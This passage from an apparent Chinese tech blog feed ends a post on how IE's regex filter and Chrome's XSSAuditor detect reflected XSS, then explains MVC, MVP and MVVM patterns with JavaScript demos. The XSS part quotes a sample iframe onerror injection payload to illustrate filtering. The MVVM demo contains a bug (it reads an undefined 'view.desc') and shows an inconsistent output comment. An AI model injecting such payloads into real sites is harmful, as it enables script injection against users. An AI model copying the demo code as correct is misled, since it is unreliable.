filter。<br>有一堆的正则表达式。<br>每一行正则式代表一条规则。IE在判断时会扫描URL，对匹配上的正则表达式的url报警，提示发现xss攻击并将字符替换为“#“。</p><hr><p>chrome XSSAuditor的工作原理<br>chrome的XSSAuditor也被整合到了渲染引擎WebKit中。</p><p>当网页加载时，XSSAuditor会在页面之前苹果用户的输入。它首先评估用户输入是否包含有恶意内容，如果有就拦截。XSSAuditor也会检查用户是否会“反射”到正在渲染的页面中。</p><hr><p><strong><em>原理的区别：</em></strong><br>与IE不同的是，chrome的XSSAuditor并没有使用正则的形式去判断。chrome的xss过滤是在词法解析阶段进行的。在解析网页时，html代码会被分解成不同的token（每个token即一个元素），XSSAuditor会逐一审查token，将token中存在的危险属性、字段和url比较，若url中也有同样的内容，则XSSAuditor会认为这是一个反射型xss攻击，随后会对该字段进行过滤处理。</p><p>例如在检查如下代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&lt;iframe src=&quot;x&quot; onerror=&quot;ale2rt(6)&quot;\&gt;\&lt;/iframe\&gt;</span><br></pre></td></tr></table></figure><p>会依次做如下判断:  </p><ul><li>1.检查开始标签iframe，如果包含属性src、onerror,则认为可能危险，继续检查</li><li>2.如果src 不是以javascript:开头，则安全，放行。</li><li>3.onerror中包含脚本，检查这段代码是否同样出现在url中。</li><li>4.如果出现在url中，认为这个地方有问题，这段代码会被过滤成&lt;iframe src=”x” onerror=”void(0)”&gt;&lt;/iframe&gt; 如果没有出现在url中，认为这个地方没有问题，继续。</li><li>5.检查终止标签iframe，没有问题，全流程结束</li></ul><blockquote><p>火狐浏览器为什么没有xss filter机制<br>XSS攻击也应正了安全圈内非常有名的一句话：所有的输入都是有害的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h4&gt;&lt;p&gt;XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>MV* 模式</title>
    <link href="http://swingboy.github.io/2018/08/31/MV-%E6%A8%A1%E5%BC%8F/"/>
    <id>http://swingboy.github.io/2018/08/31/MV-模式/</id>
    <published>2018-08-31T15:15:35.000Z</published>
    <updated>2020-04-24T03:13:03.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MV-模式"><a href="#MV-模式" class="headerlink" title="MV* 模式"></a>MV* 模式</h1><h4 id="三个非常重要的架构模式："><a href="#三个非常重要的架构模式：" class="headerlink" title="三个非常重要的架构模式："></a>三个非常重要的架构模式：</h4><p>1、MVC (Model(模型)-View(视图)-Controller(控制器))<br>2、MVP (Model(模型)-View(视图)-Presenter(中介者))<br>3、MVVM (Model(模型)-View(视图)-ViewModel(视图模型)) </p><p>过去，这些模式已经被大量用于构建桌面和服务器端的应用程序，但它只是在最近一些年才被应用到JavaScript。</p><ul><li>MV*模式主要解决的问题, View代码难以维护的问题。</li><li>MV*模式将View中的逻辑分离出去，形成一个弱逻辑的易于维护的视图。</li><li>MV<em> 中的</em>是Model和View的桥梁，负责保持Model和View的”同步”。</li></ul><h2 id="MVC（Model-View-Controller）"><a href="#MVC（Model-View-Controller）" class="headerlink" title="MVC（Model-View-Controller）"></a>MVC（Model-View-Controller）</h2><p>MVC除了把应用程序分成View、Model层，还额外的加了一个Controller层，它的职责为进行Model和View之间的协作（路由、输入预处理等）的应用逻辑；Model进行处理业务逻辑。</p><p>Model、View、Controller三个层次的依赖关系如下：</p><p><img src="/imgs/MV-模式/mvc.png" alt></p><p>大体流程：  </p><ul><li>View 传送指令到 Controller  </li><li>Controller 完成业务逻辑后，要求 Model 改变状态  </li><li>Model 将新的数据发送到 View，用户得到反馈  </li></ul><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>Controller和View都依赖Model层，Controller和View可以互相依赖。在一些资料Controller和View之间的依赖关系可能不一样，有些是单向依赖，有些是双向依赖，这个其实关系不大，最终它们的依赖关系都是为了把处理用户行为触发的事件处理权交给Controller。</p><h4 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h4><p>1、View是把控制权交移给Controller，Controller执行应用程序相关的应用逻辑（对来自View数据进行预处理、决定调用哪个Model的接口等等）。<br>2、Controller操作Model，Model执行业务逻辑对数据进行处理。但不会直接操作View，可以说它是对View无知的。<br>3、View和Model的同步消息是通过观察者模式进行，而同步操作是由View自己请求Model的数据然后对视图进行更新。</p><p>需要特别注意的是MVC模式的精髓在于第三点：Model的更新是通过观察者模式告知View的，具体表现形式可以是Pub/Sub或者是触发Events。而网上很多对于MVC的描述都没有强调这一点。通过观察者模式的好处就是：不同的MVC三角关系可能会有共同的Model，一个MVC三角中的Controller操作了Model以后，两个MVC三角的View都会接受到通知，然后更新自己。保持了依赖同一块Model的不同View显示数据的实时性和准确性。</p><h4 id="MVC优点："><a href="#MVC优点：" class="headerlink" title="MVC优点："></a>MVC优点：</h4><p>把业务逻辑和展示逻辑分离，模块化程度高。且当应用逻辑需要变更的时候，不需要变更业务逻辑和展示逻辑，只需要Controller换成另外一个Controller (观察者模式可以做到多视图同时更新)</p><h4 id="MVC缺点："><a href="#MVC缺点：" class="headerlink" title="MVC缺点："></a>MVC缺点：</h4><p>Controller测试困难。因为视图同步操作是由View自己执行，而View只能在有UI的环境下运行。在没有UI环境下对Controller进行单元测试的时候，应用逻辑正确性是无法验证的：Model更新的时候，无法对View的更新操作进行断言。<br>View无法组件化。View是强依赖特定的Model的，如果需要把这个View抽出来作为一个另外一个应用程序可复用的组件就困难了。因为不同程序的的Domain Model是不一样的</p><h4 id="前端的MVC与服务端的MVC"><a href="#前端的MVC与服务端的MVC" class="headerlink" title="前端的MVC与服务端的MVC"></a>前端的MVC与服务端的MVC</h4><blockquote><p>与服务端显著的差别来自于controller：在后台应用中，用户和服务器之间的交互是通过http请求实现的，因此后台controller的表达形式是http请求的handler，并且和router（定义网站的url规则）紧密相关; 而前端应用中，用户和网页之间的交互主要是通过操作事件（例如点击鼠标、键盘输入等）实现的，因此前端的controller这里可以简单理解为各种交互事件的handler。</p></blockquote><h4 id="backbone-js"><a href="#backbone-js" class="headerlink" title="backbone.js"></a>backbone.js</h4><p>轻量级，支持jquery，自带路由，对象化视图，强大的sync机制减少页面大小从而加快页面显示。</p><h4 id="Breeze-js"><a href="#Breeze-js" class="headerlink" title="Breeze.js"></a>Breeze.js</h4><p>国产货，众联无限开发的一套独立自研的前端MVC框架。他的概念很有意思，就是将后端开发语言，如Java，的概念模拟应用到前端。有class有继承，能实现模板和应用绑定。</p><p>优点：概念模拟，学习成本低，上手快。封装很薄，扩展性和兼容性都很好<br>缺点：相关的组件和第三方资源比较少，依赖jquery和seajs</p><p>—————-分割线————————</p><p>不同人、前后端对于 MVC 的理解有巨大的差异<br>这些基本的还是要了解的<br>mvc：实际上后端开发过程中是v-c-m-c-v，v和m并没有关系  </p><p>DEMO:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">var Myapp = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">var Model = function()&#123;</span><br><span class="line">this.data = &#123;&#125;;</span><br><span class="line">this.getData = function()&#123;</span><br><span class="line">return this.data;</span><br><span class="line">&#125;</span><br><span class="line">this.setData = function(obj)&#123;</span><br><span class="line">this.data = obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var View = function()&#123;</span><br><span class="line">var _model;</span><br><span class="line">this.click = function()&#123;</span><br><span class="line">var _controller = new Controller();</span><br><span class="line">_model = _controller.render(&apos;MVC&apos;);</span><br><span class="line">var content = _model.getData().content;</span><br><span class="line"></span><br><span class="line">document.querySelector(&apos;#content&apos;).innerHTML = content;</span><br><span class="line">console.log(&apos;&lt;p&gt;&apos; + content + &apos; &lt;/p&gt;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var Controller = function()&#123;</span><br><span class="line">this.render = function(content)&#123;</span><br><span class="line">var model = new Model();</span><br><span class="line">//... my logis</span><br><span class="line">model.setData(&#123;content: content&#125;);</span><br><span class="line">return model;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var _view = new View();</span><br><span class="line">_view.click();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">var myapp = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">myapp.Model = function() &#123;</span><br><span class="line">    var val = 0;</span><br><span class="line"></span><br><span class="line">    this.add = function(v) &#123;</span><br><span class="line">        if (val &lt; 100) val += v;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.sub = function(v) &#123;</span><br><span class="line">        if (val &gt; 0) val -= v;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.getVal = function() &#123;</span><br><span class="line">        return val;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    var self = this, </span><br><span class="line">        views = [];</span><br><span class="line"></span><br><span class="line">    this.register = function(view) &#123;</span><br><span class="line">        views.push(view);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.notify = function() &#123;</span><br><span class="line">        for(var i = 0; i &lt; views.length; i++) &#123;</span><br><span class="line">            views[i].render(self);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">myapp.View = function(controller) &#123;</span><br><span class="line">    var $num = $(&apos;#num&apos;),</span><br><span class="line">        $incBtn = $(&apos;#increase&apos;),</span><br><span class="line">        $decBtn = $(&apos;#decrease&apos;);</span><br><span class="line"></span><br><span class="line">    this.render = function(model) &#123;</span><br><span class="line">        $num.text(model.getVal());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    $incBtn.click(controller.increase);</span><br><span class="line">    $decBtn.click(controller.decrease);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">myapp.Controller = function() &#123;</span><br><span class="line">    var model = null,</span><br><span class="line">        view = null;</span><br><span class="line"></span><br><span class="line">    this.init = function() &#123;</span><br><span class="line">        /* 初始化 */</span><br><span class="line">        model = new myapp.Model();</span><br><span class="line">        view = new myapp.View(this);</span><br><span class="line"></span><br><span class="line">        /* View向Model注册，当Model更新就会去通知View */</span><br><span class="line">        model.register(view);</span><br><span class="line">        model.notify();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /* 让Model更新数值并通知View更新视图 */</span><br><span class="line">    this.increase = function() &#123;</span><br><span class="line">        model.add(1);</span><br><span class="line">        model.notify();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.decrease = function() &#123;</span><br><span class="line">        model.sub(1);</span><br><span class="line">        model.notify();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var controller = new myapp.Controller();</span><br><span class="line">controller.init();</span><br></pre></td></tr></table></figure><h2 id="MVP（Model-View-Presenter）"><a href="#MVP（Model-View-Presenter）" class="headerlink" title="MVP（Model-View-Presenter）"></a>MVP（Model-View-Presenter）</h2><p>模型-视图-展示器(MVP)是MVC设计模式的一个衍生模式,它专注于提升展现逻辑。它来自于上个世纪九十年代早期的一个叫做Taligent的公司.而MVC和MVP的目标都直指对整个多组件关注点的分离,它们之间有一些基础上的不同。</p><p>MVP 模式将 Controller 改名为 Presenter，同时改变了通信方向。</p><p>MVP打破了View原来对于Model的依赖，其余的依赖关系和MVC模式一致。</p><p>图示：</p><p><img src="/imgs/MV-模式/mvp.png" alt></p><p>1、各部分之间的通信，都是双向的。<br>2.、View 与 Model 不发生联系，都通过 Presenter 传递。<br>3、View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而 Presenter非常厚，所有逻辑都部署在那里。</p><p>和MVC模式一样，用户对View的操作都会从View交移给Presenter。Presenter会执行相应的应用程序逻辑，并且对Model进行相应的操作；而这时候Model执行完业务逻辑以后，也是通过观察者模式把自己变更的消息传递出去，但是是传给Presenter而不是View。Presenter获取到Model变更的消息以后，通过View提供的接口更新界面。</p><p>关键点：</p><p>1、View不再负责同步的逻辑，而是由Presenter负责。Presenter中既有应用程序逻辑也有同步逻辑。<br>2、View需要提供操作界面的接口给Presenter进行调用。（关键）</p><p>对比在MVC中，Controller是不能操作View的，View也没有提供相应的接口；而在MVP当中，Presenter可以操作View，View需要提供一组对界面操作的接口给Presenter进行调用；Model仍然通过事件广播自己的变更，但由Presenter监听而不是View。</p><h4 id="MVP（Passive-View）优点"><a href="#MVP（Passive-View）优点" class="headerlink" title="MVP（Passive View）优点"></a>MVP（Passive View）优点</h4><p>便于测试。Presenter对View是通过接口进行，在对Presenter进行不依赖UI环境的单元测试的时候。可以通过Mock一个View对象，这个对象只需要实现了View的接口即可。然后依赖注入到Presenter中，单元测试的时候就可以完整的测试Presenter应用逻辑的正确性。</p><p>View可以进行组件化。在MVP当中，View不依赖Model。这样就可以让View从特定的业务场景中脱离出来，可以说View可以做到对业务完全无知。它只需要提供一系列接口提供给上层操作。这样就可以做到高度可复用的View组件。</p><h4 id="MVP缺点："><a href="#MVP缺点：" class="headerlink" title="MVP缺点："></a>MVP缺点：</h4><p>Presenter中除了应用逻辑以外，还有大量的View-&gt;Model，Model-&gt;View的手动同步逻辑，造成Presenter比较笨重，维护起来会比较困难。</p><blockquote><p>MVP 的架构模式是有两种情况的，一种叫做 supervising controller 另一种是 passive view，后者由于 vm 之间没有任何的联系，所以能够与 MVC 之间比较容易的区分。</p></blockquote><p>DEMO:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">var Model = function()&#123;</span><br><span class="line">    this.data =&#123;&#125;;</span><br><span class="line">    this.getData = function()&#123;</span><br><span class="line">        return this.data;</span><br><span class="line">    &#125;</span><br><span class="line">    this.setData = function(obj)&#123;</span><br><span class="line">        this.data = obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var View = function()&#123;</span><br><span class="line">    this.show = function(desc)&#123;</span><br><span class="line">        console.log(&apos;&lt;p&gt;&apos; + desc + &apos;&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.click = function()&#123;</span><br><span class="line">        var _controller = new Presenter(this);</span><br><span class="line">        _controller.render(&apos;MVC&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var Presenter = function(view)&#123;</span><br><span class="line">    var _model = new Model();</span><br><span class="line">    var _view = view;</span><br><span class="line">    this.render = function(desc)&#123;</span><br><span class="line">        //...处理业务</span><br><span class="line">        _model.setData(&#123;type:&apos;hello MVP&apos;&#125;)</span><br><span class="line">        var type = _model.getData().type;</span><br><span class="line">        _view.show(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var _view = new View();</span><br><span class="line">_view.click();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">var myapp = &#123;&#125;;</span><br><span class="line">myapp.Model = function() &#123;</span><br><span class="line">    var val = 0;</span><br><span class="line"></span><br><span class="line">    this.add = function(v) &#123;</span><br><span class="line">        if (val &lt; 100) val += v;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.sub = function(v) &#123;</span><br><span class="line">        if (val &gt; 0) val -= v;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.getVal = function() &#123;</span><br><span class="line">        return val;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">myapp.View = function() &#123;</span><br><span class="line">    var $num = $(&apos;#num&apos;),</span><br><span class="line">        $incBtn = $(&apos;#increase&apos;),</span><br><span class="line">        $decBtn = $(&apos;#decrease&apos;);</span><br><span class="line"></span><br><span class="line">    this.render = function(model) &#123;</span><br><span class="line">        $num.text(model.getVal());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.init = function() &#123;</span><br><span class="line">        var presenter = new myapp.Presenter(this);</span><br><span class="line">        $incBtn.click(presenter.increase);</span><br><span class="line">        $decBtn.click(presenter.decrease);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">myapp.Presenter = function(view) &#123;</span><br><span class="line">    var _model = new myapp.Model();</span><br><span class="line">    var _view = view;</span><br><span class="line"></span><br><span class="line">    _view.render(_model);</span><br><span class="line"></span><br><span class="line">    this.increase = function() &#123;</span><br><span class="line">        _model.add(1);</span><br><span class="line">        _view.render(_model);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.decrease = function() &#123;</span><br><span class="line">        _model.sub(1);</span><br><span class="line">        _view.render(_model);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">new myapp.View().init();</span><br></pre></td></tr></table></figure><h4 id="Riot-js"><a href="#Riot-js" class="headerlink" title="Riot.js"></a>Riot.js</h4><p>riot.js是一个客户端模型-视图-呈现(MVP)框架并且它非常轻量级甚至小于1kb. 所有它能构建的有如下：一个模板引擎，路由，甚至是库和一个严格的并具有组织的MVP模式。当模型数据变化时视图也会自动更新。</p><p><a href="https://github.com/riot/riot" target="_blank" rel="noopener">Riot.js</a></p><h2 id="MVVM（Model-View-ViewModel）"><a href="#MVVM（Model-View-ViewModel）" class="headerlink" title="MVVM（Model-View-ViewModel）"></a>MVVM（Model-View-ViewModel）</h2><p>MVVM 模式将 Presenter 改名为 ViewModel，基本上与 MVP 模式完全一致。MVVM可以看作是一种特殊的MVP（Passive View）模式，或者说是对MVP模式的一种改良。</p><p>唯一的区别是，它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然.</p><p>图示：<br><img src="/imgs/MV-模式/mvvm.png" alt></p><h4 id="MVVM的调用关系"><a href="#MVVM的调用关系" class="headerlink" title="MVVM的调用关系"></a>MVVM的调用关系</h4><p>MVVM的调用关系和MVP一样。但是，在ViewModel当中会有一个叫Binder。以前全部由Presenter负责的View和Model之间数据同步操作交由给Binder处理。你只需要在View的模版语法当中，指令式地声明View上的显示的内容是和Model的哪一块数据绑定的。当ViewModel对进行Model更新的时候，Binder会自动把数据更新到View上去，当用户对View进行操作（例如表单输入），Binder也会自动把数据更新到Model上去。这种方式称为：双向数据绑定。</p><p>来张图再：<br><img src="/imgs/MV-模式/mvvm_binder.png" alt></p><p>MVVM把View和Model的同步逻辑自动化了。以前Presenter负责的View和Model同步不再手动地进行操作，而是交由框架所提供的Binder进行负责。只需要告诉Binder，View显示的数据对应的是Model哪一部分即可。(重点区别)</p><h4 id="MVVM的优点："><a href="#MVVM的优点：" class="headerlink" title="MVVM的优点："></a>MVVM的优点：</h4><p>提高可维护性。解决了MVP大量的手动View和Model同步的问题，提供双向绑定机制。提高了代码的可维护性。<br>简化测试。因为同步逻辑是交由Binder做的，View跟着Model同时变更，所以只需要保证Model的正确性，View就正确。大大减少了对View同步更新的测试。</p><h4 id="MVVM的缺点"><a href="#MVVM的缺点" class="headerlink" title="MVVM的缺点"></a>MVVM的缺点</h4><p>过于简单的图形界面不适用，或说牛刀杀鸡。<br>对于大型的图形应用程序，视图状态较多，ViewModel的构建和维护的成本都会比较高。<br>数据绑定的声明是指令式地写在View的模版当中的，这些内容是没办法去打断点debug的。  </p><h4 id="Knockout-js"><a href="#Knockout-js" class="headerlink" title="Knockout.js"></a>Knockout.js</h4><p>K.O.是一个MVVM框架，受到其支持者的大量好评。它强调陈述式UI绑定和自动UI刷新。<br>优点：支持绑定，文档做得出色，引导系统超级赞。<br>缺点：绑定语法晦涩，缺乏坚实的视图组件层次结构。希望能够轻松地重用组件，也觉得定义成一个MVVM框架是有害的。这些框架中基本没有MVC，但都是（MVP,MVVM之类的）的变种。  </p><h4 id="Angular-js"><a href="#Angular-js" class="headerlink" title="Angular.js"></a>Angular.js</h4><p>AngularJS 诞生于2009年，由Misko Hevery 等人创建，后为Google所收购。是一款优秀的前端JS框架，已经被用于Google的多款产品当中。AngularJS有着诸多特性，最为核心的是：MVW（Model-View-Whatever）、模块化、自动化双向数据绑定、语义化标签、依赖注入等等。</p><h4 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h4><p>Vue.js是用于构建交互式的 Web界面的库。它提供了 MVVM数据绑定和一个可组合的组件系统，具有简单、灵活的API。从技术上讲， Vue.js集中在 MVVM 模式上的视图模型层，并通过双向数据绑定连接视图和模型。实际的 DOM操作和输出格式被抽象出来成指令和过滤器。相比其它的MVVM框架，Vue.js更容易上手。</p><p>DEMO:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">var Myapp = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Myapp.Model = function(viewModel)&#123;</span><br><span class="line">this.viewModel = viewModel;</span><br><span class="line">this.viewModel.bindModel(this);</span><br><span class="line">this.data = &#123;&#125;;</span><br><span class="line">this.getData = function()&#123;</span><br><span class="line">return this.data;</span><br><span class="line">&#125;</span><br><span class="line">this.setData = function(data)&#123;</span><br><span class="line">this.data = data;</span><br><span class="line">this.viewModel.onModelChange(this);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Myapp.View = function(viewModel)&#123;</span><br><span class="line">this.viewModel = viewModel;</span><br><span class="line">this.viewModel.bindView(this);</span><br><span class="line">this._desc = &apos;MVVM&apos;;</span><br><span class="line">this.show = function(_desc)&#123;</span><br><span class="line">_desc &amp;&amp; (this._desc = _desc);</span><br><span class="line">console.log(&apos;&lt;p&gt;&apos; + this._desc + &apos;&lt;/p&gt;&apos;);</span><br><span class="line">document.querySelector(&apos;#content&apos;).innerHTML = this._desc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">this.editDesc = function(desc)&#123;</span><br><span class="line">// this._desc = &apos;MVVM&apos;;</span><br><span class="line">this._desc = desc;</span><br><span class="line">this.viewModel.onPageChange(this);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Myapp.ViewModel = function()&#123;</span><br><span class="line">var _model;</span><br><span class="line">var _view;</span><br><span class="line">var _this = this;</span><br><span class="line"></span><br><span class="line">_this.bindModel = function(model)&#123;</span><br><span class="line">_model = model;</span><br><span class="line">&#125;</span><br><span class="line">_this.bindView = function(view)&#123;</span><br><span class="line">_view = view;</span><br><span class="line">&#125;</span><br><span class="line">_this.onPageChange = function(view)&#123;</span><br><span class="line">_model.setData(&#123;desc: view.desc&#125;);</span><br><span class="line">&#125;</span><br><span class="line">_this.onModelChange = function(model)&#123;</span><br><span class="line">_view.show(model.getData().desc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var viewModel = new Myapp.ViewModel();</span><br><span class="line">var model = new Myapp.Model(viewModel);</span><br><span class="line">var view = new Myapp.View(viewModel);</span><br><span class="line"></span><br><span class="line">view.show();</span><br><span class="line">// &lt;p&gt;MVVM&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">view.editDesc(&apos;test&apos;);</span><br><span class="line">// &lt;p&gt;TEST&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">model.setData(&#123;desc:&apos;hello MVVM&apos;&#125;);</span><br><span class="line">// &lt;p&gt;hello MVVM&lt;/p&gt;</span><br></pre></td></tr></table></figure><h2 id="Model-View-Editor（MVE）"><a href="#Model-View-Editor（MVE）" class="headerlink" title="Model-View-Editor（MVE）"></a>Model-View-Editor（MVE）</h2><p>略</p><h2 id="FLUX"><a href="#FLUX" class="headerlink" title="FLUX"></a>FLUX</h2><p>Flux 